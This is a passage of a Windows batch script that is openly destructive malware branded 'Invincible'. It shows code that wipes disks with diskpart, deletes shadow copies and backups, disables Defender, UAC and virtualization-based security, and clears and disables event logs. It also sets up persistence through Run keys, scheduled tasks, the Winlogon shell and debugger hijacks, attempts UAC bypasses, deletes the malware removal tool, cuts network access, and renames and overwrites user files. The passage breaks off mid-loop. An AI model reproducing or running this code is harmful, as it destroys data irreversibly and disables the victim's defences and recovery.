reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileMenu /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoManageMyComputerVerb /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWindowsUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSecurityTab /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeAnimation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDFSTab /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoHardwareTab /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoComputersNearMe /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoEntireNetwork /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWorkgroupContents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSaveSettings /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoThemesTab /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeKeyboardNavigationIndicators /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRemoteDestop /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWelcomeScreen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPublishingWizard /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWebServices /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoOnlinePrintsWizard /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsHistory /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v ClearRecentDocsOnExit /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoInstrumentation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMBalloonTip /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoChangingWallPaper /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoAddingComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoDeletingComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoEditingComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoClosingComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoHTMLWallPaper /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v SaveZoneInformation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v HideZoneInfoOnProperties /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v DoNotConnectToWindowsUpdateInternetLocations /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v WUServer /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v WUStatusServer /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v DisableDualScan /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Servicing" /v RepairContentServerSource /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Servicing" /v UseWindowsUpdate /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v ScheduledInstallDay /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v ScheduledInstallTime /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v UseWUServer /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DoNotConnectToWindowsUpdateInternetLocations /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v SetDisableUXWUAccess /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v ExcludeWUDriversInQualityUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v TargetReleaseVersion /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v ProductVersion /t REG_SZ /d "Windows 10" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v TargetReleaseVersionInfo /t REG_SZ /d "22H2" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v ManagePreviewBuilds /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v BranchReadinessLevel /t REG_DWORD /d 20 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DeferFeatureUpdates /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DeferFeatureUpdatesPeriodInDays /t REG_DWORD /d 365 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v PauseFeatureUpdatesStartTime /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v PauseFeatureUpdatesEndTime /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DeferQualityUpdates /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DeferQualityUpdatesPeriodInDays /t REG_DWORD /d 30 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v PauseQualityUpdatesStartTime /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v PauseQualityUpdatesEndTime /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableOSUpgrade /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v AllowOSUpgrade /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v ReservationsAllowed /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v IgnoreMOAppDownloadLimit /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v IgnoreMOUpdateDownloadLimit /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v SetProxyBehaviorForUpdateDetection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v FillEmptyContentUrls /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v EnableWUAuAsDefaultAUService /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DoNotEnforceEnterpriseTLSCertPinningForUpdateDetection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableDualScan /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v EnableSoftwareNotifications /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v EnableFeaturedSoftware /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v AllowTemporaryEnterpriseFeatureControl /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v AllowWindowsUpdateToInstallLatestDrivers /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v EnableUpdateNotification /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v AutoUpdateCfg /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v ElevateNonAdmins /t REG_DWORD /d 0 /f >nul 2>&1

goto :disk_wipe_all

:disk_wipe_all
set "dp_temp=%TEMP%\dp_wipe_%random%.ps1"
(
    echo $disks = Get-Disk ^| Where-Object { $_.OperationalStatus -eq 'Online' }
    echo foreach ($disk in $disks) {
    echo     $partitions = $disk ^| Get-Partition
    echo     foreach ($partition in $partitions) {
    echo         if ($partition.DriveLetter) {
    echo             $driveLetter = $partition.DriveLetter
    echo             $drive = Get-Volume -DriveLetter $driveLetter
    echo             if ($drive.FileSystemLabel -ne 'System Reserved') {
    echo                 $drive ^| Dismount-Volume -Access ReadWrite -ErrorAction SilentlyContinue
    echo                 $drive ^| Remove-Volume -ErrorAction SilentlyContinue
    echo             }
    echo         }
    echo     }
    echo }
) > "!dp_temp!"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!dp_temp!" 2>nul 1>nul
del "!dp_temp!" 2>nul
for /f "tokens=*" %%F in ('^(echo Rescan ^& echo List Disk^) ^| diskpart ^| find /I "online"') do (
    echo %%F | find "Disk 0" >nul
    if errorlevel 1 (
        for /f "tokens=2" %%D in ("%%F") do (
            (echo select disk %%D & echo clean all) | diskpart >nul 2>&1
        )
    )
)
powershell -NoProfile -Command "Start-Sleep -s 10" >nul 2>&1
goto :DeleteShadowCopies

:DeleteShadowCopies
cls
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance -Confirm:$false -ErrorAction SilentlyContinue" >nul 2>&1 Start-Sleep -Seconds 2; ex   it 0" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Volume | ForEach-Object { if ($_.DriveLetter) { $drive = $_.DriveLetter + ':\'; cipher /w:$drive } }; Get-CimInstance Win32_LogicalDisk | ForEach-Object { $drive = $_.DeviceID; cipher /w:$drive }" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path 'C:\System Volume Information\' -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*' -ErrorAction SilentlyContinue | ForEach-Object { Remove-Item -Path $_.FullName -Force -Recurse -ErrorAction SilentlyContinue }" >nul 2>&1
goto :invincible_payload

:invincible_payload
set "CurrentScript=!f!"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$token = [System.IntPtr]::Zero; $hProcess = [System.Diagnostics.Process]::GetCurrentProcess().Handle; $true" >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v AlternateShell /t REG_SZ /d "!CurrentScript!" /f >nul 2>&1
reg add "HKCU\Environment" /v windir /t REG_EXPAND_SZ /d "%SystemRoot%\System32\pcadm.dll,c:\windows\temp\poc.dll" /f >nul 2>&1
schtasks /run /tn "\Microsoft\Windows\Application Experience\PcaPatchDbTask" >nul 2>&1
timeout /t 1 /nobreak >nul
reg delete "HKCU\Environment" /v windir /f >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$a=[AppDomain]::CurrentDomain.DefineDynamicAssembly(2,1).DefineDynamicModule(2,1).DefineType(0,1);$b=$a.DefinePInvokeMethod('RAiLaunchAdminProcess','appinfo.dll',8264,2,0,0,[int],[type[]]@([IntPtr],[string],[int],[IntPtr]),2,1);[IntPtr]$c=[IntPtr]::Zero;$b.Invoke($null,@([IntPtr]::Zero,'cmd.exe',0,[IntPtr]::Zero))" >nul 2>&1
bcdedit /set {globalsettings} advancedoptions false >nul 2>&1
bcdedit /set {globalsettings} hypervisorlaunchtype Off >nul 2>&1
bcdedit /set {current} hypervisorlaunchtype Off >nul 2>&1
powershell -Command "Get-NetAdapter | Disable-NetAdapter -Confirm:$false" >nul 2>&1
ipconfig /flushdns >nul 2>&1
netsh winsock reset >nul 2>&1
netsh int ip reset >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$Action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c %SystemDrive%\invincible\invincible.bat'; $Trigger = New-ScheduledTaskTrigger -AtLogOn; $Principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName 'InvincibleLaunch' -Action $Action -Trigger $Trigger -Principal $Principal -Force" >nul 2>&1
schtasks /create /tn "Microsoft\Windows\Update\Invincible" /tr "%SystemDrive%\invincible\invincible.bat" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
schtasks /create /tn "Microsoft\Windows\Update\Invincible2" /tr "%SystemDrive%\invincible\invincible.bat" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
wevtutil cl System >nul 2>&1
wevtutil cl Application >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil set-log System /enabled:false >nul 2>&1
wevtutil set-log Security /enabled:false >nul 2>&1
auditpol /clear /y >nul 2>&1
fsutil usn deletejournal /d %SystemDrive% >nul 2>&1
del /f /q /s "%WINDIR%\Prefetch\*.*" >nul 2>&1
del /f /q /s "%WINDIR%\Temp\*.*" >nul 2>&1
del /f /q /s "%TEMP%\*.*" >nul 2>&1
mkdir "%SystemDrive%\invincible" 2>nul
copy "%f%" "%SystemDrive%\invincible\invincible.bat" >nul 2>&1
copy "%f%" "%SystemRoot%\System32\invincible.bat" >nul 2>&1
copy "%f%" "%SystemRoot%\SysWOW64\invincible.bat" >nul 2>&1
copy "%f%" "%SystemRoot%\invincible.bat" >nul 2>&1
copy "%f%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\invincible.bat" >nul 2>&1
reg copy HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal_Backup /s /f >nul 2>&1
reg delete HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal /f >nul 2>&1
reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\volsnap /f >nul 2>&1
reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\volsnap /f >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1
wbadmin delete backup -keepVersions:0 -quiet >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access" /v "EnableControlledFolderAccess" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Invincible" /t REG_SZ /d "%SystemDrive%\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Invincible" /t REG_SZ /d "%SystemDrive%\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "%SystemDrive%\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "%SystemDrive%\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "%SystemDrive%\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "%SystemDrive%\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe" /v Debugger /t REG_SZ /d "%SystemDrive%\invincible\invincible.bat" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "0 0 0" /f >nul 2>&1
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1
set "MAX_FILES=9999"
for /l %%i in (1,1,!MAX_FILES!) do (type nul > "%SystemDrive%\f_%%i_!random!.tmp" 2>nul)
for /f "delims=" %%i in ('dir /b /s /a "%~dp0invincible.bat" 2^>nul') do (
    if /i "%%~f0" NEQ "%%~fi" ( del /f /q /a "%%~fi" 2>nul )
)
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if not exist "%SystemDrive%\Drive%%L" mkdir "%SystemDrive%\Drive%%L" 2>nul
    powershell -NoProfile -Command "if (-not (Get-PSDrive -Name '%%L' -ErrorAction SilentlyContinue)) { New-PSDrive -Name '%%L' -PSProvider FileSystem -Root '%SystemDrive%\Drive%%L' -Persist | Out-Null }" 2>nul 1>nul
    copy "!f!" "%SystemDrive%\Drive%%L\invincible.bat" >nul 2>&1
    copy "!f!" "%SystemDrive%\Drive%%L\system32\invincible.bat" >nul 2>&1
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Inv%%L" /t REG_SZ /d "%SystemDrive%\Drive%%L\invincible.bat" /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Inv%%L" /t REG_SZ /d "%SystemDrive%\Drive%%L\invincible.bat" /f >nul 2>&1
)
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if not exist "%SystemDrive%\$Recycle.Bin\%%L" mkdir "%SystemDrive%\$Recycle.Bin\%%L" 2>nul
    copy "!f!" "%SystemDrive%\$Recycle.Bin\%%L\invincible.bat" >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "InvRec%%L" /t REG_SZ /d "%SystemDrive%\$Recycle.Bin\%%L\invincible.bat" /f >nul 2>&1
)
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if not exist "%SystemRoot%\System\%%L" mkdir "%SystemRoot%\System\%%L" 2>nul
    copy "!f!" "%SystemRoot%\System\%%L\invincible.bat" >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "InvSys%%L" /t REG_SZ /d "%SystemRoot%\System\%%L\invincible.bat" /f >nul 2>&1
)
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if not exist "%Public%\%%L" mkdir "%Public%\%%L" 2>nul
    copy "!f!" "%Public%\%%L\invincible.bat" >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "InvPub%%L" /t REG_SZ /d "%Public%\%%L\invincible.bat" /f >nul 2>&1
)
takeown /f "%USERPROFILE%\Videos" /r /d y >nul 2>&1
takeown /f "%SystemRoot%\System32\mrt.exe" >nul 2>&1
icacls "%SystemRoot%\System32\mrt.exe" /grant administrators:F >nul 2>&1
del /f /q "%SystemRoot%\System32\mrt.exe" >nul 2>&1
takeown /f "%SystemRoot%\System32\MRT-KB*.exe" /r /d y >nul 2>&1
del /f /q "%SystemRoot%\System32\MRT-KB*.exe" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d "INVINCIBLE WAS HERE" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d "Your system has been upgraded to Invincible Edition. Enjoy the invincibility!" /f >nul 2>&1

for /r "%SystemDrive%\" %%f in (*.*) do (
    if /i not "%%~xf"==".exe" if /i not "%%~xf"==".dll" if /i not "%%~xf"==".sys" if /i not "%%~xf"==".efi" if /i not "%%~xf"==".bat" if /i not "%%~xf"==".ps1" if /i not "%%~xf"==".cmd" if /i not "%%~xf"==".dat" if /i not "%%~xf"==".invincible" (
        ren "%%f" "%%~nf.invincible" 2>nul
    )
)

for /r "%SystemDrive%\" %%i in (*.invincible) do (
    if exist "%%i" if not exist "%%i\*" (
        echo Your system has been upgraded to Invincible Edition. > "%%i"
        echo. >> "%%i"
        echo This system is now invincible. >> "%%i"
        echo. >> "%%i"
        echo --- Invincible WAS HERE --- >> "%%i"
    ) 2>nul
)

goto :disk

:disk
set "d=%TEMP%\f_!random!"
set "x=!d:\=_!_b_!random!.tmp"
md "!d!" 2>nul
fsutil file createnew "!x!" 1073741824 >nul 2>&1
set "drive_letters=A B C D E F G H I J K L M N O P Q R S T U V W X Y Z"
for %%L in (!drive_letters!) do (
    if not exist "%%L:\" (
        subst "%%L:" "!d!" >nul 2>&1
    )
)
for /l %%i in (1,1,20) do (
    set "sparse=!d!\sparse_%%i_!random!.tmp"
    fsutil file createnew "!sparse!" 1073741824 >nul 2>&1
    fsutil sparse setflag "!sparse!" >nul 2>&1
    fsutil sparse setrange "!sparse!" 0 1073741824 >nul 2>&1
)
set "junk=!d!\junk_!random!.txt"
for /l %%i in (1,1,100) do (
    echo !random!!random!!random!!random!!random! >> "!junk!"
)
for /l %%i in (1,1,10) do (
    set "mount=!d!\mount_%%i"
    md "!mount!" 2>nul
    mountvol "!mount!" /R >nul 2>&1
    mountvol "!mount!" \\?\Volume{!random!!random!!random!-!random!} >nul 2>&1
)
set "symlink=!d!\system_link"
mklink /J "!symlink!" "%SystemRoot%\System32" >nul 2>&1
for /l %%i in (1,1,50) do (
    set "hardlink=!d!\hardlink_%%i_!random!.exe"
    fsutil hardlink create "!hardlink!" "%SystemRoot%\System32\cmd.exe" >nul 2>&1
)
icacls "!d!" /grant "*S-1-5-32-544:F" /t /c /q >nul 2>&1
icacls "!d!" /grant "*S-1-5-11:R" /t /c /q >nul 2>&1
icacls "!d!" /deny "*S-1-5-32-545:(OI)(CI)(RX)" /t /c /q >nul 2>&1
set "mount_point=!d!\m_!random!"
md "!mount_point!" 2>nul
for /f "tokens=2" %%i in ('powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=3\" | ForEach-Object { $_.DeviceID }" 2^>nul ^| find ":"') do (
    mountvol "!mount_point!" "%%i\" >nul 2>&1
    rmdir "!mount_point!" 2>nul
    md "!mount_point!" 2>nul
)
for /l %%i in (1,1,50) do (
    set "deep=!d!\deep_%%i"
    md "!deep!" 2>nul
    pushd "!deep!" 2>nul
    for /l %%j in (1,1,100) do (
        type nul > "!_deep!\file_%%j.tmp" 2>nul
        for /l %%k in (1,1,10) do (
            set "sub=!_deep!\sub_%%k"
            md "!sub!" 2>nul
            type nul > "!sub!\data.bin" 2>nul
        )
    )
    popd 2>nul
)
set "e=$d = [System.IO.DriveInfo]::GetDrives(); foreach ($dr in $d) { try { $null = fsutil volume diskfree $dr.Name.Replace('\\','') } catch {} }"
powershell -Command "!e!" >nul 2>&1
set "mft=!d!\mft_!random!.dat"
fsutil volume mft "%SystemDrive%\%~2" > "!mft!" 2>nul
fsutil volume mft "%SystemDrive%" /w >nul 2>&1
for /l %%i in (1,1,100) do (
    fsutil file queryallocranges offset=0 length=1073741824 "!x!" >nul 2>&1
